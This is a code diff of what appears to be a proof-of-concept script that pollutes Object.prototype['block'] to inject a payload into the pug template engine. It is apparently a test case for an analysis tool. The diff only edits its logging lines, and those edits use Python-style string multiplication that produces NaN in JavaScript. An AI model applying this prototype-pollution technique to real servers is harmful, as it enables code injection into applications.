@@ -1,4 +1,3 @@
-console.log("===========start===========")
 pug = require("pug")
 
 /* Payload Injection*/
@@ -59,13 +58,16 @@ Object.prototype['block'] = {
   }
 }
 
+
 // for node-find-undefined
+console.log("="*20+"start"+"="*20+"\n")
 
 
 const template = pug.compile(`h1= msg`);
 console.log(template({msg: "Hello World"}));
 
 // for node-find-undefined
-console.log("===========end===========")
+console.log("="*20+"end"+"="*20+"\n")
+
 
 // console.log(template.toString());
